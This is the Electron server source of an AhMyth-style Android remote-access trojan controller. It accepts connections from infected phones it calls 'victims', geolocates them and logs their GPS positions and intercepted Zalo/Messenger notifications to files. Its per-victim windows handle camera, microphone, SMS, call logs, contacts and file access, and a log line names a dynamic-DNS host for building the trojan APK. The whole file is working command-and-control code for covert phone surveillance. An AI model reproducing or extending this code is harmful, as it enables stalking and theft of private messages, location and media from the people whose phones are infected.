const { app, BrowserWindow } = require('electron')
const electron = require('electron');
const { ipcMain } = require('electron');
const http = require('http');
var io = require('socket.io');
var geoip = require('geoip-lite');
var victimsList = require('./app/assets/js/model/Victim');
module.exports = victimsList;
const path = require('path');
const fs = require('fs');
//--------------------------------------------------------------
let win;
let display;
var windows = {};
var IO;

// Persistent logging for debugging
const logFile = path.join(__dirname, 'server_debug.log');
function logToFile(msg) {
  const timestamp = new Date().toISOString();
  const line = `[${timestamp}] ${msg}\n`;
  console.log(msg);
  fs.appendFileSync(logFile, line);
}

logToFile('Server Starting...');
logToFile('Log file path: ' + logFile);

function createWindow() {


  // get Display Sizes ( x , y , width , height)
  display = electron.screen.getPrimaryDisplay();



  //------------------------SPLASH SCREEN INIT------------------------------------
  // create the splash window
  let splashWin = new BrowserWindow({
    width: 600,
    height: 400,
    frame: false,
    transparent: true,
    icon: __dirname + '/app/assets/img/icon.png',
    type: "splash",
    alwaysOnTop: true,
    show: false,
    position: "center",
    resizable: false,
    toolbar: false,
    fullscreen: false,
    webPreferences: {
      nodeIntegration: true
    }
  });


  // load splash file
  splashWin.loadURL('file://' + __dirname + '/app/splash.html');

  splashWin.webContents.on('did-finish-load', function () {
    splashWin.show(); //close splash
  });


  // Emitted when the window is closed.
  splashWin.on('closed', () => {
    // Dereference the window object
    splashWin = null
  })


  //------------------------Main SCREEN INIT------------------------------------
  // Create the browser window.
  win = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    width: 800,
    height: 600,
    show: false,
    resizable: false,
    position: "center",
    toolbar: false,
    fullscreen: false,
    transparent: true,
    frame: false,
    webPreferences: {
      nodeIntegration: true
    }
  });

  win.loadURL('file://' + __dirname + '/app/index.html');
  //open dev tools
  //win.webContents.openDevTools()

  // Emitted when the window is closed.
  win.on('closed', () => {
    // Dereference the window object, usually you would store windows
    // in an array if your app supports multi windows, this is the time
    // when you should delete the corresponding element.
    win = null
  })

  // Emitted when the window is finished loading.
  win.webContents.on('did-finish-load', function () {
    setTimeout(() => {
      // Check if splashWin still exists before closing
      if (splashWin) {
        splashWin.close();
      }
      if (win) {
        win.show();
      }
    }, 2000);
  });
}



// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', createWindow)

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  // On macOS it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform !== 'darwin') {
    app.quit()
  }
})

app.on('activate', () => {
  // On macOS it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (win === null) {
    createWindow()
  }
})



//handle the Uncaught Exceptions



// fired when start listening
// It will be fired when AppCtrl emit this event
var currentServer = null;
var isClosing = false;

ipcMain.on('SocketIO:Listen', function (event, port) {
  console.log('Received Listen command on port:', port);

  if (isClosing) {
    console.log('Server is already closing, ignoring request...');
    return;
  }

  if (currentServer) {
    console.log('Closing existing server...');
    isClosing = true;
    const oldServer = currentServer;
    currentServer = null;

    // Force close any existing connections if possible
    oldServer.close(() => {
      console.log('Existing server closed.');
      isClosing = false;
      startNewServer(port);
    });

    // Safety timeout to ensure it doesn't hang forever
    setTimeout(() => {
      if (isClosing) {
        console.log('Server closure timeout, forcing new server start...');
        isClosing = false;
        startNewServer(port);
      }
    }, 2000);
  } else {
    startNewServer(port);
  }

  function startNewServer(port) {
    console.log('Attempting to start new server on port:', port);
    const server = http.createServer((req, res) => {
      logToFile('Incoming HTTP request: ' + req.method + ' ' + req.url + ' from: ' + req.socket.remoteAddress);
      if (req.url === '/test') {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('AhMyth Server is Running and Reachable!\nTime: ' + new Date().toLocaleString());
        return;
      }
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end('AhMyth Server - Ready');
    });
    currentServer = server;

    // Use simplest init for Socket.IO 1.4.5 compatibility
    IO = io(server);

    server.listen(port, () => {
      logToFile('Server is now listening on port: ' + port);
      logToFile('IMPORTANT: Use ahmythserver.duckdns.org in APK Builder for INTERNET monitoring');
    });

    IO.sockets.on('connection', function (socket) {
      const socketIp = socket.conn.remoteAddress || (socket.request.connection && socket.request.connection.remoteAddress) || 'unknown';
      const socketPort = (socket.request.connection && socket.request.connection.remotePort) || 0;

      logToFile('New Socket.IO connection! ID: ' + socket.id + ' IP: ' + socketIp);

      // Notify UI immediately that *something* connected (for debugging)
      if (win && win.webContents) {
        win.webContents.send('SocketIO:Listen', 'Handshaking with ' + socketIp);
      }

      var query = socket.handshake.query;
      logToFile('Query params: ' + JSON.stringify(query));

      var index = query.id;

      if (!index) {
        logToFile('REJECTED: No ID provided in query.');
        return;
      }

      // Robust IP extraction
      var ip = socketIp || 'unknown';
      if (ip.includes(':')) {
        ip = ip.substring(ip.lastIndexOf(':') + 1);
      }
      if (ip === '1') ip = '127.0.0.1';

      var country = null;
      var geo = geoip.lookup(ip); // check ip location
      if (geo)
        country = geo.country.toLowerCase();

      console.log('Victim registered:', index, 'IP:', ip);

      // Check if this victim already has an active Lab window
      if (windows[index]) {
        logToFile('Victim ' + index + ' reconnected. Updating active Lab window socket.');
        const childWin = BrowserWindow.fromId(windows[index]);
        if (childWin) {
          childWin.webContents.victim = socket; // Update the socket reference in the window
          childWin.webContents.send('SocketIO:VictimReconnected');
        }
      }

      // Add or Update the victim in victimList
      victimsList.addVictim(socket, ip, socketPort, country, query.manf, query.model, query.release, index);

      // Theo dõi vị trí từ xa: cập nhật khi client gửi locationUpdate
      socket.on('locationUpdate', function (data) {
        const id = query.id;
        if (victimsList.getVictim(id)) {
          const lat = data.enable && data.lat != null ? data.lat : null;
          const lng = data.enable && data.lng != null ? data.lng : null;
          victimsList.updateLocation(id, lat, lng, !!data.enable);

          // Log location to file for persistent history
          const logDir = path.join(__dirname, 'logs', id);
          fs.ensureDirSync(logDir);
          const locLog = path.join(logDir, 'locations.log');
          const time = new Date().toLocaleString();
          fs.appendFileSync(locLog, `[${time}] Lat: ${lat}, Lng: ${lng}\n`);

          if (win && win.webContents)
            win.webContents.send('SocketIO:VictimLocationUpdated', id);
        }
      });

      // Theo dõi thông báo (Zalo/Messenger): lưu vào file
      socket.on('notificationUpdate', function (data) {
        const id = query.id;
        const logDir = path.join(__dirname, 'logs', id);
        fs.ensureDirSync(logDir);
        const msgLog = path.join(logDir, 'messages.log');

        const time = new Date().toLocaleString();
        const logLine = `[${time}] [${data.package}] ${data.title}: ${data.text}\n`;
        fs.appendFileSync(msgLog, logLine);

        logToFile(`MSG from ${id}: ${data.title}: ${data.text}`);
      });

      //------------------------Notification SCREEN INIT------------------------------------
      // create the Notification window
      let notification = new BrowserWindow({
        frame: false,
        x: display.bounds.width - 280,
        y: display.bounds.height - 78,
        show: false,
        width: 280,
        height: 78,
        resizable: false,
        toolbar: false,
        webPreferences: {
          nodeIntegration: true
        }
      });

      // Emitted when the window is finished loading.
      notification.webContents.on('did-finish-load', function () {
        notification.show();
        setTimeout(function () { notification.destroy() }, 3000);
      });

      notification.webContents.victim = victimsList.getVictim(index);
      notification.loadURL('file://' + __dirname + '/app/notification.html');



      //notify renderer proccess (AppCtrl) about the new Victim
      console.log('Sending SocketIO:NewVictim to UI for index:', index);
      if (win && win.webContents) {
        win.webContents.send('SocketIO:NewVictim', index);
      }

      socket.on('disconnect', function () {
        logToFile('Victim disconnected: ' + index);
        // Do NOT remove from persistent victimsList here, just mark as offline if we had status
        // But for this UI, we might want to remove it to keep the list clean if it's not persistent
        // According to original code, it removes from victimList:
        victimsList.rmVictim(index);

        //notify renderer proccess (AppCtrl) about the disconnected Victim
        if (win && win.webContents) {
          win.webContents.send('SocketIO:RemoveVictim', index);
        }

        if (windows[index]) {
          //notify renderer proccess (LabCtrl) if opened about the disconnected Victim
          BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
          //delete the window from windowsList
          delete windows[index]
        }
      });
    });
  }
});


//handle the Uncaught Exceptions
process.on('uncaughtException', function (error) {
  console.error('Uncaught Exception:', error);
  if (error.code == "EADDRINUSE") {
    if (win && win.webContents)
      win.webContents.send('SocketIO:Listen', "Address Already in Use");
  } else {
    electron.dialog.showErrorBox("ERROR", error.stack || error.message || JSON.stringify(error));
  }
});



// Fired when Victim's Lab is opened (startHash optional, e.g. '#/location')
ipcMain.on('openLabWindow', function (e, page, index, startHash) {
  //------------------------Lab SCREEN INIT------------------------------------
  // create the Lab window
  let child = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    parent: win,
    width: 600,
    height: 650,
    darkTheme: true,
    transparent: true,
    resizable: false,
    frame: false,
    webPreferences: {
      nodeIntegration: true
    }
  })

  //add this window to windowsList
  windows[index] = child.id;
  //child.webContents.openDevTools();

  // pass the victim info to this victim lab
  child.webContents.victim = victimsList.getVictim(index).socket;
  const labUrl = 'file://' + __dirname + '/app/' + page + (startHash || '');
  child.loadURL(labUrl)

  child.once('ready-to-show', () => {
    child.show();
  });

  child.on('closed', () => {
    delete windows[index];
    //on lab window closed remove all socket listners
    if (victimsList.getVictim(index).socket) {
      victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
      victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
      victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
      victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
      victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
      victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
      victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
    }
  })
});